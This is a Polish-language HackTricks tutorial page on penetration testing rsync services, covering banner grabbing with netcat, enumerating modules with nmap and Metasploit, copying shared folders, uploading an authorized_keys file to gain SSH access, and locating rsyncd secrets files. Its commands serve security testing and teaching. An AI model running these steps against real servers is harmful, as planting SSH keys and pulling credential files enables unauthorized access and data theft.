# 873 - Testowanie penetracyjne Rsync

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## **Podstawowe informacje**

Z [wikipedia](https://en.wikipedia.org/wiki/Rsync):

> **rsync** to narzdzie do efektywnego [transferu](https://en.wikipedia.org/wiki/File\_transfer) i [synchronizacji](https://en.wikipedia.org/wiki/File\_synchronization) [plik贸w](https://en.wikipedia.org/wiki/Computer\_file) midzy komputerem a zewntrznym dyskiem twardym oraz midzy [komputerami](https://en.wikipedia.org/wiki/Computer) w sieci poprzez por贸wnywanie [czas贸w modyfikacji](https://en.wikipedia.org/wiki/Timestamping\_\(computing\)) i rozmiar贸w plik贸w.[\[3\]](https://en.wikipedia.org/wiki/Rsync#cite\_note-man\_page-3) Jest powszechnie stosowany w systemach operacyjnych typu [Unix-like](https://en.wikipedia.org/wiki/Unix-like). Algorytm rsync to rodzaj [kodowania delta](https://en.wikipedia.org/wiki/Delta\_encoding) i jest u偶ywany do minimalizowania u偶ycia sieci. [Zlib](https://en.wikipedia.org/wiki/Zlib) mo偶e by u偶ywany do dodatkowego [kompresowania danych](https://en.wikipedia.org/wiki/Data\_compression),[\[3\]](https://en.wikipedia.org/wiki/Rsync#cite\_note-man\_page-3) a [SSH](https://en.wikipedia.org/wiki/Secure\_Shell) lub [stunnel](https://en.wikipedia.org/wiki/Stunnel) mog by u偶ywane do zabezpiecze.

**Domylny port:** 873
```
PORT    STATE SERVICE REASON
873/tcp open  rsync   syn-ack
```
### Wyliczanie

#### Baner i komunikacja manualna

Podczas wyliczania usugi rsync, warto rozpocz od sprawdzenia banera, kt贸ry mo偶e zawiera informacje o wersji i konfiguracji serwera rsync. Mo偶na to zrobi, wykonujc polecenie:

```bash
nc <adres_ip> 873
```

Po nawizaniu poczenia, mo偶na rcznie komunikowa si z serwerem rsync, wysyajc i odbierajc polecenia. Przykadowe polecenia, kt贸re mo偶na u偶y to:

```bash
@RSYNCD: <wersja>
```

```bash
@ERROR: <komunikat_bdu>
```

Ta metoda pozwala na rczne eksplorowanie usugi rsync i uzyskiwanie informacji o jej konfiguracji i funkcjonalnociach.
```bash
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0        <--- You receive this banner with the version from the server
@RSYNCD: 31.0        <--- Then you send the same info
#list                <--- Then you ask the sever to list
raidroot             <--- The server starts enumerating
USBCopy
NAS_Public
_NAS_Recycle_TOSRAID	<--- Enumeration finished
@RSYNCD: EXIT         <--- Sever closes the connection


#Now lets try to enumerate "raidroot"
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
raidroot
@RSYNCD: AUTHREQD 7H6CqsHCPG06kRiFkKwD8g    <--- This means you need the password
```
### **Wyszukiwanie udostpnionych folder贸w**

**Moduy Rsync** s rozpoznawane jako **udostpnione katalogi**, kt贸re mog by **chronione hasami**. Aby zidentyfikowa dostpne moduy i sprawdzi, czy wymagaj hasa, u偶ywane s nastpujce polecenia:
```bash
nmap -sV --script "rsync-list-modules" -p <PORT> <IP>
msf> use auxiliary/scanner/rsync/modules_list

# Example with IPv6 and alternate port
rsync -av --list-only rsync://[dead:beef::250:56ff:feb9:e90a]:8730
```
Bd藕 wiadomy, 偶e niekt贸re udziay mog nie pojawi si na licie, co mo偶e oznacza ich ukrycie. Ponadto, dostp do niekt贸rych udzia贸w mo偶e by ograniczony do okrelonych **powiadcze**, co jest sygnalizowane przez komunikat **"Odmowa dostpu"**.

### [**Atak Brute Force**](../generic-methodologies-and-resources/brute-force.md#rsync)

### Rczne u偶ycie Rsync

Po uzyskaniu listy **modu贸w**, dziaania zale偶 od tego, czy wymagane jest uwierzytelnienie. Bez uwierzytelnienia, **wylistowanie** i **kopiowanie** plik贸w z udostpnionego folderu do lokalnego katalogu osiga si poprzez:
```bash
# Listing a shared folder
rsync -av --list-only rsync://192.168.0.123/shared_name

# Copying files from a shared folder
rsync -av rsync://192.168.0.123:8730/shared_name ./rsyn_shared
```
Ten proces **rekursywnie przesya pliki**, zachowujc ich atrybuty i uprawnienia.

Z u偶yciem **powiadcze**, mo偶na wylistowa i pobra pliki z udostpnionego folderu, postpujc w nastpujcy spos贸b, gdzie pojawi si proba o podanie hasa:
```bash
rsync -av --list-only rsync://username@192.168.0.123/shared_name
rsync -av rsync://username@192.168.0.123:8730/shared_name ./rsyn_shared
```
Aby **przesa zawarto**, tak jak plik _**authorized_keys**_ dla dostpu, u偶yj:
```bash
rsync -av home_user/.ssh/ rsync://username@192.168.0.123/home_user/.ssh
```
## POST

Aby zlokalizowa plik konfiguracyjny rsyncd, wykonaj:
```bash
find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
```
W tym pliku parametr _secrets file_ mo偶e wskazywa na plik zawierajcy **nazwy u偶ytkownik贸w i hasa** do uwierzytelniania rsyncd.


## Referencje
* [https://www.smeegesec.com/2016/12/pentesting-rsync.html](https://www.smeegesec.com/2016/12/pentesting-rsync.html)

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
